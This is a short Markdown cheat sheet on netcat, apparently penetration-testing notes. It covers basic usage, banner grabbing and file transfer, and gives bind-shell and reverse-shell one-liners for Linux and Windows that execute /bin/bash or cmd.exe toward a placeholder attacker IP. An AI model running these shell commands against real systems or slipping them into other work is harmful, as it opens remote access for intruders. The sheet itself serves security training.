# Netcat

* TCP protocol
* no encryption for data transmitted

## netcat important parameters

> -l: Listen mode  
> -e: Program to execute after connection occurs  
> -n: Don't perform DNS lookups on names of machines on the other side  
> -v: verbose, printing out messages on Standard Error, such as when a connection occurs

## Basic usage

### Fundamental Client \(\#1\)

> nc \[ip address\] \[port\]

### Fundamental Listener \(\#2\)

> nc -l -p \[port\]

## Backdoor Shell

### Bind Shell

Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The **attacker then connects to the victim** machineâ€™s listener which then leads to code or command execution on the server.

#### netcat client \(\#1\) on **attacking machine** to access the shell

#### Command Execute on Victim Machine

#### Linux

> nc -l -p \[port\] -e /bin/bash

#### Windows

> C:&gt; nc -l -p \[port\] -e cmd.exe

### Reverse Shell

A reverse shell is a type of shell in which the target machine **communicates back** to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.

#### netcat listener \(\#2\) on **attacking machine** to capture the shell

#### Command Execute on Victim Machine

#### Linux

> nc \[attacker ip\] \[attacker listen port\] -e /bin/bash

#### Windows

> C:&gt; nc \[attacker ip\] \[attacker listen port\] -e cmd.exe

## TCP Banner Grabbing

```text
echo "" | nc -v -n -w1 [IP Address] [Ports]
echo -e "HEAD / HTTP/1.0\n\n" | nc 192.168.2.22 80
```

## Transferring a File

### Push a file from client to listener

Receiving ends:

> nc -l -p \[port\] **&gt;** \[filename to be saved\]

Sending ends:

> nc -w3 \[ip address\] \[port\] **&lt;** \[file to be send\]

### Pull a file from listener back to client

File host:

> nc -l -p \[port\] &lt; \[file to be pulled\]

Pulling ends:

> nc -w3 \[ip address\] \[port\] **&gt;** \[file to be retrieve\]
